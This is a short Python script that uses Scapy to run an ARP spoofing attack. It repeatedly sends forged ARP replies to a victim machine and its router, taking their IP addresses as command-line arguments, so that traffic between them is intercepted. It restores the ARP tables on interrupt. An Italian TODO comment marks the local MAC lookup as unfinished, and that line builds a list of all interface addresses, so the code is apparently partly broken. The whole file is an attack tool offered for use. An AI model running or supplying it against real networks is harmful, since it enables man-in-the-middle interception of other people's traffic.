from scapy.all import *
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
    # TODO devo capire come recuperare il mac di questa macchina
    #source_mac = getmacbyip('localhost')
    source_mac = [get_if_hwaddr(i) for i in get_if_list()]
    #source_mac = Ether().src
    print(source_mac)
    packet = ARP('is-at', source_mac, source_ip, dest_mac, dest_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op='is-at', hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    #packet = ARP('is-at', source_mac, source_ip, dest_mac, dest_ip)
    send(packet, verbose=False)

def main():
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    try:
        print('Sending spoofed ARP packets')
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print('Restoring ARP Tables')
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        quit()

main()